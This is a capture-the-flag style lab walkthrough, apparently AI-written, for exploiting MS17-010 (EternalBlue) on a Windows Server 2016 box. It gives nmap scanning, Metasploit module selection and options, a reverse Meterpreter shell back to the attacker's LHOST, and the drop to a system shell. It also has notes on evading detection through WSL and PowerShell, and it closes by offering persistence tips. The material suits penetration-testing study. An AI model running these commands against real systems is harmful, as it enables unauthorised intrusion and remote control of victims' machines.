
---

## **1. Enumerate the Host**

Start by scanning the target to identify open ports, services, and the operating system.

**Command:**

```bash
nmap -v -A 10.129.201.97
```

**Findings:**

- **Open Ports:**
    
    - `80` → IIS 10.0 (HTTP)
        
    - `135` → RPC
        
    - `139` → NetBIOS
        
    - `445` → SMB
        
- **Host OS:** Windows Server 2016 Standard (Build 14393)
    
- **Hostname:** SHELLS-WINBLUE
    
- **Workgroup:** WORKGROUP
    

---

## **2. Check for MS17-010 Vulnerability**

Use Metasploit to determine if the target is vulnerable.

**Commands:**

```bash
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.129.201.97
run
```

**Output:**

```
[+] Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64
```

---

## **3. Configure the Exploit and Payload**

Search for EternalBlue-related exploits:

```bash
search eternal
```

Select the **psexec** module:

```bash
use exploit/windows/smb/ms17_010_psexec
```

Set the necessary options:

```bash
set RHOSTS 10.129.201.97
set LHOST 10.10.14.12
set LPORT 4444
```

Optional (for authenticated exploits):

```bash
set SMBUser <username>
set SMBPass <password>
```

---

## **4. Execute the Exploit**

Run:

```bash
exploit
```

**Successful Output:**

```
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215)
```

---

## **5. Post-Exploitation**

Check the current user:

```text
meterpreter > getuid
```

Drop into a system shell:

```text
meterpreter > shell
```

**Expected Output:**

```
C:\Windows\system32>
```

---

## **6. Understanding Windows Shells**

|Feature|**CMD (cmd.exe)**|**PowerShell (powershell.exe)**|
|---|---|---|
|**History**|Minimal logging|Maintains command history|
|**Capabilities**|Lightweight, basic commands|Supports complex scripts, .NET, cmdlets|
|**Stealth**|Less detectable|More logging, easier to trace|
|**Usage**|Legacy support, pre-Win7 systems|Available from Windows 7 onward|

**Prompt Indicators:**

- `C:\>` → CMD
    
- `PS C:\>` → PowerShell
    

---

## **7. Advanced Topics**

### **WSL (Windows Subsystem for Linux)**

- Allows execution of Linux binaries within Windows.
    
- Malware may use WSL to evade detection.
    
- WSL traffic can sometimes bypass Windows Defender or firewall rules.
    

### **PowerShell Core on Linux**

- Cross-platform PowerShell environment.
    
- Can be abused for stealthy attacks in hybrid networks.
    

---

## **8. Summary of Tools**

|**Tool**|**Purpose**|
|---|---|
|**Nmap**|Scanning, service detection, banner grabbing|
|**msfconsole**|Exploitation and payload delivery|
|**meterpreter**|Post-exploitation shell|
|**cmd.exe / powershell.exe**|Native Windows shells|

---

## **9. Key Commands Recap**

### **Scan and Banner Grab**

```bash
nmap -v -A <target-ip>
nmap -v --script banner.nse <target-ip>
```

### **Metasploit**

```bash
msfconsole
search eternal
use exploit/windows/smb/ms17_010_psexec
set RHOSTS <target-ip>
set LHOST <your-ip>
set LPORT <port>
exploit
```

### **Meterpreter**

```text
getuid
shell
```

---

Would you like me to add **post-exploitation tips**, such as privilege escalation or persistence techniques, to this guide?